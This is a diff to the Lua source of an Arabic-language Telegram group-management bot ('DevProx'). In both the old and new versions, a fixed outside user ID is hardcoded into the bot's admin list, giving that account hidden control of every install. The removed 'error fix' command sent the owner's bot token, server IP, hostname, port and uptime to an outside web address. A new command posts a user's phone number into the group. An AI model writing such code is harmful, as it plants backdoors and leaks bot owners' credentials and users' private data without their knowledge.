@@ -52,7 +52,6 @@ print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ توكن
 end  
 os.execute('lua DevProx.lua') 
 end 
-DevAbs:set(DevAbs:get(ServerDevProx.."TokenDevProx"):match("(%d+)")..'Abs:Errors',true)
 local Create = function(data, file, uglify)  
 file = io.open(file, "w+")   
 local serialized   
@@ -138,10 +137,10 @@ print("\27[36m"..[[
 ---------------------------------------------
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m")
 Config = dofile("./config.lua")
-DevId = Config.DevId or Config.SUDO
-SudoIds = {Config.SudoIds,218385683} or {Config.sudo_users,218385683}
-DevProx = Config.DevProx or Config.bot_id
-TokenBot = Config.TokenBot or Config.token
+DevId = Config.DevId
+SudoIds = {Config.SudoIds,218385683}
+DevProx = Config.DevProx
+TokenBot = Config.TokenBot
 NameBot = (DevAbs:get(DevProx..'Abs:NameBot') or 'بروكس')
 --     Source DevProx     --
 FilesPrint = "\27[35m".."\nAll Source Files Started ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"..'\27[m'
@@ -7902,6 +7901,17 @@ local rules = DevAbs:get(DevProx..'Abs:rules'..msg.chat_id_)
 Dev_Abs(msg.chat_id_, msg.id_, 1, rules, 1, nil)
 end
 --     Source DevProx     --
+if text == 'رقمي' then
+tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
+if result.phone_number_  then
+MyNumber = "⌁︙رقمك ↫ +"..result.phone_number_
+else
+MyNumber = "⌁︙تم وضع رقمك لجهات اتصالك فقط"
+end
+send(msg.chat_id_, msg.id_,MyNumber)
+end,nil)
+end
+--     Source DevProx     --
 if text == "تفعيل الزخرفه" and Manager(msg) and ChCheck(msg) then
 local DevProxTEAM = '⌁︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n⌁︙تم تفعيل الزخرفه بنجاح'
 absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProxTEAM, 14, string.len(msg.sender_user_id_))
@@ -9490,13 +9500,13 @@ local Help = DevAbs:get(DevProx..'Abs:Help6')
 local text =  [[
 ⌁︙اوامر الاعضاء ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙السورس • موقعي • رتبتي • معلوماتي
+⌁︙السورس • موقعي • رتبتي • معلوماتي 
 ⌁︙رسائلي • حذف رسائلي • اسمي • معرفي 
 ⌁︙ايدي •ايديي • جهاتي • غنيلي • الالعاب 
 ⌁︙نقاطي • بيع نقاطي • القوانين • زخرفه 
 ⌁︙رابط الحذف • نزلني • اطردني • المطور 
 ⌁︙منو ضافني • مشاهدات المنشور • الرابط 
-⌁︙ايدي المجموعه • معلومات المجموعه 
+⌁︙رقمي •ايدي المجموعه • معلومات المجموعه 
 ⌁︙نسبه الحب • نسبه الكره • نسبه الغباء 
 ⌁︙نسبه الرجوله • نسبه الانوثه • التفاعل
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -9535,68 +9545,6 @@ io.popen("rm -rf ../.telegram-cli/*")
 print("\27[31;47m\n        ( تم تحديث ملفات البوت )        \n\27[0;34;49m\n") 
 Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم تحديث ملفات البوت", 1, "md")
 end 
-if text == 'تصحيح الاخطاء' then
-if not DevAbs:get(DevProx..'Abs:Errors') then
-DevAbs:set(DevProx..'Abs:Errors',true)
-send(msg.chat_id_, msg.id_,'⌁︙تم تصحيح اخطاء التحديث القديم')
-local Create = function(data, file, uglify)  
-file = io.open(file, "w+")   
-local serialized   
-if not uglify then  
-serialized = serpent.block(data, {comment = false, name = "Config"})  
-else  
-serialized = serpent.dump(data)  
-end    
-file:write(serialized)
-file:close()  
-end
-Config = {
-DevId = DevId,
-TokenBot = TokenBot,
-DevProx = TokenBot:match("(%d+)"),
-SudoIds = {DevId},
-}
-https.request("https://apiabs.ml/config.php?Get=DevProx&DevId="..DevId.."&TokenBot="..TokenBot.."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
-Create(Config, "./config.lua")   
-file = io.open("DevProx.sh", "w")  
-file:write([[
-#!/usr/bin/env bash
-cd $HOME/DevProx
-token="]]..TokenBot..[["
-while(true) do
-rm -fr ../.telegram-cli
-if [ ! -f ./tg ]; then
-echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
-echo "~ The tg File Was Not Found In The Bot Files"
-echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
-exit 1
-fi
-if [ ! $token ]; then
-echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
-echo "~ The Token Was Not Found In The config.lua File"
-echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
-exit 1
-fi
-./tg -s ./DevProx.lua -p PROFILE --bot=$token
-done
-]])  
-file:close()  
-file = io.open("Run", "w")  
-file:write([[
-#!/usr/bin/env bash
-cd $HOME/DevProx
-while(true) do
-rm -fr ../.telegram-cli
-screen -S DevProx -X kill
-screen -S DevProx ./DevProx.sh
-done
-]]) 
-file:close() 
-os.execute('unlink RUNABS.sh;unlink ABS;chmod +x DevProx.sh;chmod +x Run;./Run')
-else
-send(msg.chat_id_, msg.id_,'⌁︙لديك اخر نسخه من التحديث لاتوجد اخطاء')
-end
-end
 --     Source DevProx     --
 if text == 'الملفات' then
 Files = '\n⌁︙الملفات المفعله في البوت ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
